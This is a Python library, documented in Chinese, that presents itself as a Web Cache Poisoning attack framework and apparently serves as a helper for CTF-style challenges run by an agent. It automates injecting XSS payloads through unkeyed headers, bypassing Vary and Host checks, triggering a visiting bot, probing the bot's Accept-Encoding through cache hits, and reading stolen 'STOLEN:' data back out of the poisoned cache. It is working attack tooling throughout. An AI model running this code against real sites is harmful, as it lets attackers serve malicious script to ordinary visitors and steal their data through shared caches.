"""summary: Web Cache Poisoning 攻击框架

description:
  封装 Web Cache Poisoning 攻击中的高频操作：
  - 缓存投毒（含 Host 对齐、Vary 绕过、CT 覆盖）
  - Bot Accept-Encoding 探测（利用缓存命中状态反推）
  - 缓存中缓存数据渗出（无外网环境）
  - 缓存键分析（探测主键和二级键的组成）

  依赖: 无第三方依赖（纯标准库 http.client）

  调用方式:
    import sys
    sys.path.insert(0, "$AGENT_DIR/scripts")
    from cache_poison import CachePoison, probe_accept_encoding

usage:
  作为库模块被 import，也可以直接运行进行 AE 探测。

level: intermediate
"""

import gzip
import http.client
import json
import time
from typing import Optional


class CachePoison:
    """Web Cache Poisoning 攻击框架。

    封装了缓存投毒、验证、Bot 触发、数据读取的完整流程。
    """

    def __init__(
        self,
        target_host: str,
        target_port: int = 80,
        internal_host: Optional[str] = None,
        bot_endpoint: str = "/bot/visit",
    ):
        """初始化。

        Args:
            target_host: 靶机外网地址（如 '46.62.153.171'）
            target_port: 靶机端口
            internal_host: Bot 使用的内部域名（如 'proxy:4000'）。
                           如果提供，投毒时会自动设置 Host 头对齐。
            bot_endpoint: Bot 访问端点路径
        """
        self.target_host = target_host
        self.target_port = target_port
        self.internal_host = internal_host
        self.bot_endpoint = bot_endpoint

    def request(
        self,
        method: str,
        path: str,
        headers: Optional[dict] = None,
        body: Optional[bytes] = None,
    ) -> dict:
        """发送 HTTP 请求并解析响应。

        Args:
            method: HTTP 方法
            path: 请求路径
            headers: 请求头字典
            body: 请求体（bytes）

        Returns:
            包含 status, cache, ct, body 的字典
        """
        conn = http.client.HTTPConnection(self.target_host, self.target_port)
        if body and isinstance(body, str):
            body = body.encode()

        # 如果提供了 internal_host 且 headers 中没有 Host，自动设置
        hdrs = dict(headers or {})
        if self.internal_host and "Host" not in hdrs:
            hdrs["Host"] = self.internal_host

        conn.request(method, path, body=body, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read()

        # 处理 gzip 压缩
        ce = resp.getheader("Content-Encoding") or ""
        if "gzip" in ce:
            data = gzip.decompress(data)

        result = {
            "status": resp.status,
            "cache": resp.getheader("X-Proxy-Cache"),
            "ct": resp.getheader("Content-Type"),
            "body": data.decode("utf-8", errors="replace"),
        }
        conn.close()
        return result

    def poison(
        self,
        path: str,
        injection_header: str,
        injection_value: str,
        rsc_header: str = "",
        content_type: str = "text/html",
        accept_encoding: Optional[str] = None,
        extra_headers: Optional[dict] = None,
    ) -> dict:
        """投毒缓存。

        Args:
            path: 要投毒的路径（必须是被缓存的路径）
            injection_header: 注入点对应的请求头名（如 'x-nonce'）
            injection_value: 注入的 XSS payload
            rsc_header: RSC 头的值（空字符串触发 RSC 渲染但 Vary 匹配 Bot）
            content_type: 请求 Content-Type（触发 CT 覆盖）
            accept_encoding: AE 值（必须匹配 Bot 的 AE）
            extra_headers: 额外请求头

        Returns:
            响应字典
        """
        headers = {
            injection_header: injection_value,
        }
        if rsc_header is not None:
            headers["RSC"] = rsc_header
        if content_type:
            headers["Content-Type"] = content_type
        if accept_encoding:
            headers["Accept-Encoding"] = accept_encoding
        if extra_headers:
            headers.update(extra_headers)

        return self.request("GET", path, headers=headers)

    def verify_cache_hit(self, path: str, accept_encoding: Optional[str] = None) -> bool:
        """验证缓存是否命中。

        Args:
            path: 要验证的路径
            accept_encoding: AE 值

        Returns:
            True 如果 HIT
        """
        headers = {}
        if accept_encoding:
            headers["Accept-Encoding"] = accept_encoding
        r = self.request("GET", path, headers=headers)
        return r["cache"] == "HIT"

    def trigger_bot(self, url: str, timeout: int = 15) -> dict:
        """发送 Bot 访问指定 URL。

        Args:
            url: Bot 要访问的 URL
            timeout: HTTP 连接超时时间（秒），传递给 HTTPConnection 构造函数

        Returns:
            Bot 响应，包含 status 和 body 字段
        """
        conn = http.client.HTTPConnection(self.target_host, self.target_port, timeout=timeout)
        body = json.dumps({"url": url}).encode()
        conn.request(
            "POST",
            self.bot_endpoint,
            body=body,
            headers={"Content-Type": "application/json"},
        )
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        result = {"status": resp.status, "body": data}
        conn.close()
        return result

    def read_exfil(self, path: str, accept_encoding: Optional[str] = None, marker: str = "STOLEN:", max_len: int = 4000) -> Optional[str]:
        """从缓存中读取渗出的数据。

        Args:
            path: 缓存路径
            accept_encoding: AE 值
            marker: 数据标记前缀
            max_len: 最大读取长度（从 marker 位置开始计算）

        Returns:
            从 marker 开始的子字符串，未找到返回 None
        """
        headers = {}
        if accept_encoding:
            headers["Accept-Encoding"] = accept_encoding
        r = self.request("GET", path, headers=headers)
        if marker in r["body"]:
            idx = r["body"].find(marker)
            end = min(idx + max_len, len(r["body"]))
            return r["body"][idx:end]
        return None


def probe_accept_encoding(
    target_host: str,
    target_port: int,
    internal_host: str,
    bot_endpoint: str = "/bot/visit",
    probe_path: str = "/_next/probe-ae",
    candidates: Optional[list] = None,
) -> Optional[str]:
    """探测 Bot 浏览器的 Accept-Encoding 值。

    利用缓存命中状态反推 Bot 的 AE：
    1. 让 Bot 访问一个新路径（创建以 Bot AE 为二级键的缓存）
    2. 攻击者用不同 AE 值读取，X-Proxy-Cache: HIT 的那个就是 Bot 的 AE

    Args:
        target_host: 靶机外网地址
        target_port: 靶机端口
        internal_host: 内部域名
        bot_endpoint: Bot 端点
        probe_path: 探测路径（必须是被缓存的路径，且未被访问过）
        candidates: AE 候选值列表

    Returns:
        Bot 的 AE 值，未找到返回 None
    """
    if candidates is None:
        candidates = [
            "gzip, deflate, br",
            "gzip, deflate",
            "gzip",
            "gzip, br",
            "deflate",
            "identity",
            "*",
        ]

    cp = CachePoison(target_host, target_port, internal_host, bot_endpoint)

    # 步骤 1：让 Bot 先访问探测路径
    print(f"[*] 让 Bot 访问探测路径 {probe_path}...")
    bot_url = f"http://{internal_host}{probe_path}"
    cp.trigger_bot(bot_url)
    print("[*] 等待 3 秒...")
    time.sleep(3)

    # 步骤 2：用不同 AE 值读取，看哪个 HIT
    print("[*] 探测 Bot 的 AE...")
    for ae in candidates:
        r = cp.request("GET", probe_path, {"Accept-Encoding": ae})
        status = r["cache"] or "N/A"
        print(f"    AE=\"{ae}\" → {status}")
        if r["cache"] == "HIT":
            print(f"[+] Bot 的 AE: {ae}")
            return ae

    print("[-] 未找到匹配的 AE")
    return None


def probe_cache_key(
    target_host: str,
    target_port: int,
    internal_host: str,
    test_path: str = "/_next/cache-test",
) -> dict:
    """分析缓存键的组成。

    通过发送不同参数的请求，观察缓存命中情况，推断缓存键包含哪些元素。

    Args:
        target_host: 靶机外网地址
        target_port: 靶机端口
        internal_host: 内部域名
        test_path: 测试路径

    Returns:
        分析结果字典
    """
    cp = CachePoison(target_host, target_port, internal_host)

    results = {"host_in_key": None, "path_in_key": None, "ae_in_vary": None}

    # 测试 1：Host 是否在缓存键中
    r1 = cp.request("GET", test_path, {"Host": internal_host})
    r2 = cp.request("GET", test_path, {"Host": f"{target_host}:{target_port}"})
    if r1["cache"] == "MISS" and r2["cache"] == "MISS":
        # 两个都 MISS，说明 Host 在键中（不同的 Host 导致不同的缓存条目）
        results["host_in_key"] = True
    elif r1["cache"] == "MISS" and r2["cache"] == "HIT":
        results["host_in_key"] = False

    # 测试 2：AE 是否在 Vary 中
    r3 = cp.request("GET", test_path, {"Accept-Encoding": "gzip"})
    r4 = cp.request("GET", test_path, {"Accept-Encoding": "deflate"})
    if r3["cache"] == "HIT" and r4["cache"] == "MISS":
        results["ae_in_vary"] = True
    elif r3["cache"] == "HIT" and r4["cache"] == "HIT":
        results["ae_in_vary"] = False

    return results


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("用法: python cache_poison.py <target_host> <target_port> [internal_host]")
        print("示例: python cache_poison.py 46.62.153.171 4000 proxy:4000")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    internal = sys.argv[3] if len(sys.argv) > 3 else None

    if internal:
        ae = probe_accept_encoding(host, port, internal)
        if ae:
            print(f"\n结果: Bot 的 Accept-Encoding = {ae}")
        else:
            print("\n未探测到 Bot 的 AE，可能 Bot 未运行或路径未被缓存")
    else:
        print("需要提供 internal_host 参数才能进行 AE 探测")
